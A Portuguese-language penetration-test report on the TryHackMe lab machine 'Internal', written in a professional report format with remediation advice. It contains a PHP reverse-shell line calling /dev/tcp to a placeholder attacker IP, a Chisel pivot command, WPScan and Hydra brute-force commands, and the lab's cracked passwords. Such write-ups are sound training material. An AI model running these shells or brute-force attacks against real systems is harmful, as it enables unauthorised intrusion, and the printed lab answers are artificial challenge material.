
# 1 — Visão geral da metodologia

1. **Objetivo:** Comprometer completamente o ambiente interno simulando um teste de intrusão black box com foco em web + pivoting + exploração de serviço interno.
    
2. **Estrutura:** Recon → Enumeração Web → Exploração WordPress → Credenciais → SSH → Port forwarding → Jenkins → Root.
    
3. **Princípios:** Documentação completa e reprodutível com evidências e flags.
    

---

# Report — Máquina: `Internal` — `10.65.175.43`

- **Fonte:** THM
    
- **Data:** 2025-11-30
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Hard
    
- **Início:** 14:30
    
- **Finalizado:** 16:24
    
- **Tempo gasto:** 1h 54m
    

---

## 1) Executive summary

Comprometimento total do ambiente via WordPress desatualizado com brute-force no painel administrativo. Pivoting realizado através de um acesso SSH válido, permitindo descoberta e acesso a um Jenkins interno via tunelamento com Chisel. Escalonamento final a root por meio de credenciais armazenadas internamente.

---

## 2) Escopo e limitações

- **Alvo:** `internal.thm`
    
- **Serviços mapeados:** HTTP, SSH, Jenkins interno (via pivot)
    
- **Ferramentas:** Nmap, FFUF, WPScan, Reverse Shell PHP, SSH, Chisel, Hydra
    
- **Limitações:** Nenhuma restrição imposta pelo lab
    

---

## 3) Metodologia aplicada

- Enumeração externa com Nmap e FFUF
    
- Enumeração WordPress com WPScan
    
- Credenciais encontradas por força bruta
    
- RCE via edição de tema (404.php)
    
- Credenciais internas via arquivos
    
- SSH como outro usuário
    
- Port forwarding para acesso ao Jenkins
    
- Brute-force Jenkins
    
- Extração de credenciais de root
    

---

## 4) Achado principal

**Vetor primário:** Credenciais fracas no WordPress + permissões de tema para execução arbitrária  
**Pivot:** Chisel para acesso ao Jenkins interno  
**Privesc:** Credenciais armazenadas em texto claro

**PoC da RCE via PHP:**

`exec("/bin/bash -c 'bash -i >& /dev/tcp/<SEU_IP>/1234 0>&1'");`

---

## 5) Evidências / PoC (resumo)

### Nmap

`sudo nmap -Pn -sS -p- -T4 -sV 10.65.175.43`

→ Identificado WordPress na porta 80

### Enumeração WordPress

`wpscan --url http://internal.thm/blog -e u`

→ Usuário encontrado: admin

### Brute-force

`wpscan --url http://internal.thm/blog -U admin -P rockyou.txt`

→ Senha: `my2boys`

### RCE

Inserção de reverse shell no `404.php` via editor do WP.

Obtida shell como www-data.  
Encontrado arquivo:

`/opt/wp-save.txt`

→ Credencial SSH:

`aubreanna : bubb13guM!@#123`

### SSH + pivoting

Descoberta de Jenkins interno na porta **8080** com netstat.

Uso do Chisel para port forwarding:

`chisel client <ATTACKER_IP>:<PORT> R:8080:127.0.0.1:8080`

### Hydra contra Jenkins

`hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 http-post-form`

→ Senha: `spongebob`

Acesso → execução de script com shell reversa.

Em Note.txt:

`root ssh: tr0ubl13guM!@#123`

---

## 6) Impacto & Severidade

**Severidade:** Crítica

- Credenciais fracas comprometem WordPress e Jenkins
    
- Credenciais hardcoded ⇒ root compromise
    
- Exposição interna via pivot → risco total
    
- Quebra completa de segurança: C, I, A
    

---

## 7) Reproduzir (passo-a-passo)

1. Scan:
    

`nmap -Pn -sS -p- -T4 -sV <IP>`

2. Enumeração WP + brute-force
    
3. RCE via edição de tema
    
4. Coletar credenciais do sistema:
    

`cat /opt/wp-save.txt`

5. SSH como `aubreanna`
    
6. Identificar Jenkins interno (netstat)
    
7. Chisel port forward
    
8. Hydra contra Jenkins
    
9. Shell reversa a partir do Jenkins
    
10. Coletar flags em `/home` e `/root`
    

---

## 8) Recomendações (gestores)

- Implementar MFA e senhas robustas
    
- Remover credenciais em texto claro de arquivos internos
    
- Restringir acesso administrativo por rede interna segregada
    
- Revisão completa das permissões do WordPress
    
- Scanner contínuo de vulnerabilidades
    

---

## 9) Recomendações técnicas

- Restringir editor de temas do WordPress:
    

`define('DISALLOW_FILE_EDIT', true);`

- Controle de acesso ao Jenkins + RBAC
    
- SSH com chave pública, desabilitar senhas fracas
    
- Auditoria de serviços e chaves expostas
    
- Segregação de rede para serviços administrativos
    

---

## 10) Apêndice técnico

Artefatos a anexar:

#### Nmap
![](Nmap_Internal.txt)
#### Ffuf
![](FfufDirList_Internal.txt)
#### WPScan
![](Wpscan_EnumUsers_Internal.txt)

![](Wpscan_VulnsScan_Internal.txt)

![](Wpscan_Bruteforce_Internal.txt)

---

## 11) Lições aprendidas / Follow-up

- Credenciais fracas continuam sendo o vetor inicial mais eficiente
    
- Pivoting é crucial para exploração de serviços internos
    
- Jenkins frequentemente é o caminho para root
    
- Docker e ambientes internos precisam de hardening específico
